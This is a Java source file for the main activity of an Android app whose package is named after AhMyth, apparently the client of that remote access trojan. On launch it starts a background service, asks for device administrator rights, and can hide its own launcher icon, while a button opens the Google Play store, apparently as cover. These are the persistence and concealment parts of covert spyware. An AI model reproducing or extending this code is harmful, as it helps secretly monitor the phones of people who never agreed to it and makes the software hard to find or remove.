package ahmyth.mine.king.ahmyth;

import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Bundle;
import android.widget.Switch;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {
    private DevicePolicyManager devicePolicyManager;
    private ComponentName componentName;
    private SharedPreferences sharedPreferences;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        // Start the main service
        Intent serviceIntent = new Intent(this, MainService.class);
        startService(serviceIntent);

        // Initialize device admin
        componentName = new ComponentName(this, AdminReceiver.class);
        devicePolicyManager = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);

        if (!devicePolicyManager.isAdminActive(componentName)) {
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName);
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, getString(R.string.device_admin_explanation));
            startActivity(intent);
        }

        // Setup switch for hiding app icon
        Switch hide_icon_switch = findViewById(R.id.switch1);
        sharedPreferences = getSharedPreferences("AppSettings", Context.MODE_PRIVATE);
        final SharedPreferences.Editor appSettingEditor = sharedPreferences.edit();

        hide_icon_switch.setOnCheckedChangeListener((buttonView, isChecked) -> {
            appSettingEditor.putBoolean("hidden_status", isChecked);
            appSettingEditor.apply();
            if (isChecked) {
                hideAppIcon();
            } else {
                showAppIcon();
            }
        });

        boolean icon_hidden_status = sharedPreferences.getBoolean("hidden_status", false);
        if (icon_hidden_status) {
            hide_icon_switch.setChecked(true);
            hideAppIcon();
        }
    }

    private void hideAppIcon() {
        PackageManager packageManager = getPackageManager();
        ComponentName componentName = new ComponentName(this, MainActivity.class);
        packageManager.setComponentEnabledSetting(componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);
        Toast.makeText(this, "App icon hidden", Toast.LENGTH_SHORT).show();
    }

    private void showAppIcon() {
        PackageManager packageManager = getPackageManager();
        ComponentName componentName = new ComponentName(this, MainActivity.class);
        packageManager.setComponentEnabledSetting(componentName,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP);
        Toast.makeText(this, "App icon visible", Toast.LENGTH_SHORT).show();
    }

    public void openGooglePlay(android.view.View view) {
        Intent GoogleIntent = new Intent(Intent.ACTION_VIEW, Uri.parse("https://play.google.com/store/apps"));
        startActivity(GoogleIntent);
    }
} 